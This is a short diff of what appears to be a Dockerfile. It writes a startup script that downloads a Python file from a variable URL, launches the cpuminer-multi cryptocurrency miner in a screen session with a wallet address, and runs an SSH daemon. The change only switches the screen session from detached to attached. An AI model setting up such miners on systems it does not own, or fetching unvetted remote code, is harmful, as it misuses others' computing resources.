@@ -52,7 +52,7 @@ RUN cd /root && \
   echo "#!/bin/bash" > run.sh && \
   #echo '/etc/init.d/ssh start &' >> run.sh && \
   echo 'wget "$PYFILE" -O /root/run.py' >> run.sh && \
-  echo 'screen -dmS wa /root/cpuminer-multi/cpuminer $address' >> run.sh && \
+  echo 'screen -S wa /root/cpuminer-multi/cpuminer $address' >> run.sh && \
   #echo '/etc/init.d/ssh stop &' >> run.sh && \
   echo "/usr/sbin/sshd -D" >> run.sh && \
   chmod +x run.sh
